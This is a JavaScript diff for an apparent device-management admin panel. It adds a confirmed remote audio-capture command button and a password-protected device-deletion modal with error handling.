+            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
+            sendCommandToDevice(deviceId, 'mop.cmd.capture.audio', { duration_sec: 18 }, this, COMMAND_COOLDOWN_SEC);
           };
         });
+        var deleteDeviceModalDeviceId = null;
+        function openDeleteDeviceModal(deviceId) {
+          deleteDeviceModalDeviceId = deviceId;
+          document.getElementById('deleteDevicePasswordInput').value = '';
+          document.getElementById('deleteDeviceModalError').style.display = 'none';
+          document.getElementById('deleteDeviceModalError').textContent = '';
+          document.getElementById('deleteDeviceModalOverlay').style.display = 'flex';
+          document.getElementById('deleteDevicePasswordInput').focus();
+        }
+        function closeDeleteDeviceModal() {
+          deleteDeviceModalDeviceId = null;
+          document.getElementById('deleteDeviceModalOverlay').style.display = 'none';
+        }
+        document.querySelectorAll('.btn-device-delete').forEach(function(btn){
+          btn.onclick = function(){
+            var deviceId = getDeviceIdFromButton(this);
+            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+            openDeleteDeviceModal(deviceId);
+          };
+        });
+        document.getElementById('deleteDeviceModalClose').onclick = closeDeleteDeviceModal;
+        document.getElementById('deleteDeviceModalCancel').onclick = closeDeleteDeviceModal;
+        document.getElementById('deleteDeviceModalOverlay').onclick = function(e){ if (e.target === this) closeDeleteDeviceModal(); };
+        document.getElementById('deleteDeviceModalConfirm').onclick = function(){
+          var deviceId = deleteDeviceModalDeviceId;
+          var password = (document.getElementById('deleteDevicePasswordInput').value || '').trim();
+          var errEl = document.getElementById('deleteDeviceModalError');
+          if (!password) {
+            errEl.textContent = i18n.t('deleteDevicePasswordRequired') || '请输入登录密码';
+            errEl.style.display = 'block';
+            return;
+          }
+          this.disabled = true;
+          errEl.style.display = 'none';
+          adminApi.deleteDevice(deviceId, password).then(function(r){
+            if (r.status === 204 || r.ok) {
+              closeDeleteDeviceModal();
+              loadDevices();
+              alert(i18n.t('deleteDeviceSuccess') || '设备已删除');
+              return;
+            }
+            return (r.json ? r.json() : Promise.resolve({})).then(function(b){ return b; });
+          }).then(function(body){
+            document.getElementById('deleteDeviceModalConfirm').disabled = false;
+            if (body === undefined) return;
+            var msg = (body && body.code === 'invalid_credentials') ? (i18n.t('deleteDevicePasswordWrong') || '登录密码错误') : ((body && body.message) || (body && body.code) || i18n.t('networkError'));
+            errEl.textContent = msg || '';
+            errEl.style.display = 'block';
+          }).catch(function(){
+            document.getElementById('deleteDeviceModalConfirm').disabled = false;
+            errEl.textContent = i18n.t('networkError') || '网络错误，请重试';
+            errEl.style.display = 'block';
+          });
+        };
       }
       document.getElementById('auditModalClose').onclick = function(){ document.getElementById('auditModalOverlay').style.display = 'none'; };
       document.getElementById('auditModalOverlay').onclick = function(e){ if (e.target === this) this.style.display = 'none'; };
